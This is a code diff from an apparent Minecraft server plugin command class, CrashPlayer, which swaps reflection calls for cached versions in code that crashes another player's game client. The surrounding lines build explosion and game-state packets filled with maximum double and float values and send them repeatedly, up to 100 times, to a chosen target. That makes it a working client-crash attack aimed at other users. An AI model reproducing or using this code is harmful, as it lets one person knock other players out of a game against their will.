@@ -45,10 +45,10 @@ public class CrashPlayer extends Command {
                     @Override
                     public void run() {
                         if (times == 0) {
-                            Class<?> vec3D = ReflectionUtils.getClass("{nms}.Vec3D");
-                            Object c = ReflectionUtils.getConstructor(vec3D, double.class, double.class, double.class).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
-                            packetPlayOutExplosion = ReflectionUtils.getConstructor(packetGameStateClass, double.class, double.class, double.class, float.class, java.util.List.class, vec3D).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), c);
-                            packetPlayOutGameStateChange = ReflectionUtils.getConstructor(ReflectionUtils.getMinecraftClass("PacketPlayOutGameStateChange"), int.class, float.class).invoke(4, Float.MAX_VALUE);
+                            Class<?> vec3D = ReflectionUtils.getClassCached("{nms}.Vec3D");
+                            Object c = ReflectionUtils.getConstructorCached(vec3D, double.class, double.class, double.class).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
+                            packetPlayOutExplosion = ReflectionUtils.getConstructorCached(packetGameStateClass, double.class, double.class, double.class, float.class, java.util.List.class, vec3D).invoke(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), c);
+                            packetPlayOutGameStateChange = ReflectionUtils.getConstructorCached(ReflectionUtils.getMinecraftClass("PacketPlayOutGameStateChange"), int.class, float.class).invoke(4, Float.MAX_VALUE);
                         }
                         if (times++ >= 100) {
                             p.sendMessage(Start.Prefix + ChatColor.GREEN + "Stopped crashing " + ChatColor.YELLOW + anotherPlayer.getName() + "! (crashing happened 100 times)");
